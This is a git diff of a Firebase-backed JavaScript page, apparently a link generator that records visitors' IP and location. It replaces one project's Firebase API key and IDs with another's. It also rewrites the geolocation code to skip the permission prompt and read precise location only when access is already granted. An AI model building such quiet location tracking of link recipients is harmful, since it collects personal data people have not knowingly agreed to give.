@@ -5,12 +5,12 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebas
 import { getFirestore, collection, addDoc, getDocs, query, orderBy, limit, where, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
 const firebaseConfig = {
-    apiKey: "AIzaSyBEIiqPpy2JU2oqds9BS3yAJnAnxK4rJ58",
-    authDomain: "projet-estore.firebaseapp.com",
-    projectId: "projet-estore",
-    storageBucket: "projet-estore.firebasestorage.app",
-    messagingSenderId: "204606590244",
-    appId: "1:204606590244:web:79c270a5085d2d8a7b77b1"
+    apiKey: "AIzaSyAlLL2fcqWXASQ8kYcMHURlHG-haf3vl4s",
+    authDomain: "pickme-love-2026.firebaseapp.com",
+    projectId: "pickme-love-2026",
+    storageBucket: "pickme-love-2026.firebasestorage.app",
+    messagingSenderId: "1024313568025",
+    appId: "1:1024313568025:web:b36d90f9b46d681e96b388"
 };
 
 let app, db;
@@ -421,11 +421,26 @@ if (generateLinkBtn) {
 async function getIPAndLocation() {
     // 1. Try High Accuracy Geolocation first
     const getGeo = () => {
-        return new Promise((resolve, reject) => {
+        return new Promise(async (resolve, reject) => {
             if (!navigator.geolocation) {
                 reject('Geolocation not supported');
                 return;
             }
+
+            // Check if permission is already granted
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const permission = await navigator.permissions.query({ name: 'geolocation' });
+                    if (permission.state !== 'granted') {
+                        reject('Permission not granted - skipping explicit prompt');
+                        return;
+                    }
+                } catch (e) {
+                    // Fallback if permissions API fails
+                    console.log('Permissions API check failed', e);
+                }
+            }
+
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
                     resolve({
